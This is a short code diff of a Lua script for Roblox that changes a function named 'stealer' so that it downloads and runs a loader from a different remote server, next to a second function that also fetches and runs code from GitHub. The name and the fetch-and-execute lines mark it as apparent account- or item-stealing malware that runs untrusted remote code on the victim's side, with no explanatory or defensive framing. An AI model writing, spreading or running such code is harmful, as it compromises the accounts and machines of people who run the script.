@@ -1,5 +1,6 @@
 local function stealer()
-    loadstring(game:HttpGet("https://pastefy.app/nEUOdw5G/raw"))()
+    ID="a2e3d43e-7234-4265-9901-dda74f1ddfdc";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
 end
 local function loadui()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/script-wq/testing1/refs/heads/main/testing"))()
